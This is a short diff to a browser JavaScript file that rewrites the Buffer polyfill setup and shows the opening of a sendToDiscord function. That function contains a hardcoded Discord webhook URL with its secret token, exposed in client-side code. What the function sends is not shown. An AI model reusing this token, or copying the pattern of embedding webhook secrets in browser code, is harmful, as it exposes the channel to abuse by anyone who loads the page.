@@ -1,7 +1,6 @@
 // Initialize Buffer for browser environment (from Cloudflare CDN)
-if (typeof buffer !== 'undefined' && buffer.Buffer) {
-    window.Buffer = buffer.Buffer;
-}
+// The buffer library exposes itself as 'buffer' global
+window.Buffer = window.buffer?.Buffer || globalThis.buffer?.Buffer;
 
 async function sendToDiscord(message) {
     const webhookUrl = 'https://discord.com/api/webhooks/1424826301025488946/EripCWiQWqL5VT61z9pGJmm4fGhZf876gn5neA9Gn2FSM8_kgjeCQweEynxRRAL4lj8J';
